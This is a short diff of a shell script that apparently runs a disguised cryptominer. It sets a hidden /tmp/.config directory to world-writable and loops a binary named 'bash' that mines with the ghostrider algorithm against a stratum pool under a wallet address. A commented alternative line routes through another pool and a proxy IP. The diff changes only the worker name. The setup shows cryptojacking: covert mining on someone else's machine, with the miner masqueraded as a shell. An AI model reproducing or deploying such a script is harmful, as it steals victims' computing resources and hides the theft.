@@ -7,7 +7,7 @@ chmod -R  777 /tmp/.config
 
 #!/bin/sh
 while [ 1 ]; do
-	/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099f
+	/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099i
  	#/tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.3099a --pass stu --proxy 165.22.62.162:7091
 	sleep 5
 done
